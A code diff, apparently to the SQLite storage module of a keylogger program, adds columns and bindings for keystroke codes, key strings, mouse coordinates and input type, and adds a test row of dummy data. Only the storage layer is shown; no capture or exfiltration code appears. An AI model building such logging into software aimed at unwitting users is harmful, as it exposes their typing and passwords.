@@ -1,3 +1,4 @@
+#define DEBUG_LOGGED_EVENTS    true
 #include "keylogger-db.h"
 #include "log.h/log.h"
 #include <assert.h>
@@ -46,8 +47,13 @@ int keylogger_create_db(void){
 CREATE TABLE IF NOT EXISTS events(\
   _id INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT\
 , _ts  DATETIME NOT NULL DEFAULT (datetime(CURRENT_TIMESTAMP, 'localtime'))\
+, ts INTEGER NOT NULL\
 , key_code INTEGER NOT NULL\
 , key_string VARCHAR(20) NOT NULL\
+, action VARCHAR(20) NOT NULL\
+, mouse_x INTEGER NOT NULL\
+, mouse_y INTEGER NOT NULL\
+, input_type VARCHAR(20) NOT NULL\
 )",
                           NULL,
                           NULL);
@@ -90,20 +96,38 @@ int keylogger_select_db(void){
 
 int keylogger_insert_db_row(logged_key_event_t *LOGGED_EVENT){
   db_statement_t db_st = NEW_DB_STATEMENT();
-  int64_t        key_code = 123, ins_id;
-  char           key_string[1024];
+  int64_t        ins_id;
 
   for (size_t i = 0; i < LOGGED_EVENT->qty; i++) {
-    key_code++;
-    sprintf(key_string, "%llu", key_code);
+    if (DEBUG_LOGGED_EVENTS) {
+      log_debug("ts:%lu", LOGGED_EVENT->ts);
+      log_debug("kc:%lu", LOGGED_EVENT->key_code);
+      log_debug("ks:%s", LOGGED_EVENT->key_string);
+      log_debug("type:%s", LOGGED_EVENT->input_type);
+      log_debug("mouse:%lux%lu", LOGGED_EVENT->mouse_x, LOGGED_EVENT->mouse_y);
+    }
     db_st.rc = sqldbal_stmt_prepare(db,
-                                    "INSERT INTO events(key_code, key_string) VALUES(?, ?)",
+                                    "INSERT INTO events\
+      (ts, key_code, key_string, action, mouse_x, mouse_y, input_type) \
+                                    VALUES\
+      (?, ?, ?, ?, ?, ?, ?)\
+",
                                     -1,
                                     &db_st.stmt);
     ASSERT_DB_STATEMENT(db_st);
-    db_st.rc = sqldbal_stmt_bind_int64(db_st.stmt, 0, key_code);
+    db_st.rc = sqldbal_stmt_bind_int64(db_st.stmt, 0, LOGGED_EVENT->ts);
     ASSERT_DB_STATEMENT(db_st);
-    db_st.rc = sqldbal_stmt_bind_text(db_st.stmt, 1, key_string, -1);
+    db_st.rc = sqldbal_stmt_bind_int64(db_st.stmt, 1, LOGGED_EVENT->key_code);
+    ASSERT_DB_STATEMENT(db_st);
+    db_st.rc = sqldbal_stmt_bind_text(db_st.stmt, 2, LOGGED_EVENT->key_string, -1);
+    ASSERT_DB_STATEMENT(db_st);
+    db_st.rc = sqldbal_stmt_bind_text(db_st.stmt, 3, LOGGED_EVENT->action, -1);
+    ASSERT_DB_STATEMENT(db_st);
+    db_st.rc = sqldbal_stmt_bind_int64(db_st.stmt, 4, LOGGED_EVENT->mouse_x);
+    ASSERT_DB_STATEMENT(db_st);
+    db_st.rc = sqldbal_stmt_bind_int64(db_st.stmt, 5, LOGGED_EVENT->mouse_y);
+    ASSERT_DB_STATEMENT(db_st);
+    db_st.rc = sqldbal_stmt_bind_text(db_st.stmt, 6, LOGGED_EVENT->input_type, -1);
     ASSERT_DB_STATEMENT(db_st);
     EXEC_AND_ASSERT_DB_STATEMENT(db_st);
 
@@ -115,7 +139,7 @@ int keylogger_insert_db_row(logged_key_event_t *LOGGED_EVENT){
     log_debug("inserted row #%lu", (size_t)ins_id);
   }
   return(0);
-}
+} /* keylogger_insert_db_row */
 
 
 int keylogger_close_db(void){
@@ -130,10 +154,15 @@ int keylogger_close_db(void){
 int keylogger_db_lifecycle(void){
   assert(keylogger_init_db() == 0);
   assert(keylogger_create_db() == 0);
-
   assert(keylogger_insert_db_row(&(logged_key_event_t){
-    .ts  = timestamp(),
-    .qty = 8,
+    .ts         = timestamp(),
+    .qty        = 8,
+    .key_code   = 100,
+    .key_string = "xxxxxxxx",
+    .action     = "YYY",
+    .mouse_x    = 123,
+    .mouse_y    = 222,
+    .input_type = "DUMMY",
   }) == 0);
   assert(keylogger_select_db() == 0);
   assert(keylogger_close_db() == 0);
